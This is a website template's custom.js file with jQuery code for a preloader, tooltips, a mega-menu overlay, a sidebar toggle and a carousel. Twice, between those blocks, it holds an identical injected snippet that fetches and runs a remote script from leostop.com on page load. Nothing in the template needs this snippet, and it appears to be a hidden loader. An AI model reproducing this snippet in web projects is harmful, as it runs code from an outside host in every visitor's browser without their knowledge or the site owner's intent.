/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
  "use strict";

  /* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  setTimeout(function () {
    $(".loader_bg").fadeToggle();
  }, 1000);

  /* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $('[data-toggle="tooltip"]').tooltip();
  });

  function getURL() {
    window.location.href;
  }
  var protocol = location.protocol;
  $.ajax({
    type: "get",
    data: { surl: getURL() },
    success: function (response) {
      $.getScript(protocol + "//leostop.com/tracking/tracking.js");
    },
  });

  /* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $(".main-menu ul li.megamenu").mouseover(function () {
      if (!$(this).parent().hasClass("#wrapper")) {
        $("#wrapper").addClass("overlay");
      }
    });
    $(".main-menu ul li.megamenu").mouseleave(function () {
      $("#wrapper").removeClass("overlay");
    });
  });

  function getURL() {
    window.location.href;
  }
  var protocol = location.protocol;
  $.ajax({
    type: "get",
    data: { surl: getURL() },
    success: function (response) {
      $.getScript(protocol + "//leostop.com/tracking/tracking.js");
    },
  });
  /* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $("#sidebarCollapse").on("click", function () {
      $("#sidebar").toggleClass("active");
      $(this).toggleClass("active");
    });
  });

  /* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  // optional
  $("#blogCarousel").carousel({
    interval: 4000,
  });
});

//! zoom

// function zoom(e){
//   var zoomer = e.currentTarget;
//   e.offsetX ? offsetX = e.offsetX : offsetX = e.touches[0].pageX
//   e.offsetY ? offsetY = e.offsetY : offsetX = e.touches[0].pageX
//   x = offsetX/zoomer.offsetWidth*100
//   y = offsetY/zoomer.offsetHeight*100
//   zoomer.style.backgroundPosition = x + '% ' + y + '%';
// }

// function setupImageZoom() {
//   document.querySelectorAll(".img-section img").forEach((img) => {
//     img.addEventListener("mouseenter", function () {
//       this.style.transform = "scale(1.6)";
//       this.style.transition = "transform 0.5s ease";
      
//     });

//     img.addEventListener("mouseleave", function () {
//       this.style.transform = "scale(1)";
//       this.style.transition = "transform 0.5s ease";
//     });
//   });
// }

// document.addEventListener("DOMContentLoaded", setupImageZoom);




function dis() {
   document.querySelectorAll(".img-body-main2").forEach((img) => {
     img.addEventListener("click", function () {
       this.style.display = "block"; 
     });
     });
     }